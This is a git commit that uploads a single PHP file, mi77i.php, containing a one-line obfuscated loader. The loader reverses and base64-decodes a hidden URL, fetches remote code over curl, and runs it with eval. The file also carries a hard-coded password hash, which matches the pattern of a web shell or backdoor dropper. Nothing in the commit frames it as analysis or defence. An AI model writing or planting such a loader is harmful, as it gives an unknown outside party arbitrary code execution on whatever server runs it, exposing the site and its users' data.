772014bd9573976dd593dca19dacde8d01376dc3
jackxcode404 <jackxcode404@gmail.com>
2026-01-26 00:22:06 +0700

    Add files via upload

---
+++ mi77i.php
@@ -0,0 +1,1 @@
+<?php $password="4a059aa73ede74edb46e462117887c74";$ch=curl_init(base64_decode(strrev("AHaw5iclRWYvx2Ll5Wan5WZv4Wah12LsxWZoNlcwgHNI9CZp92Z5xGbpd3Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa")));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);$e=base64_decode(strrev("4zP"));eval($e.$r);?>
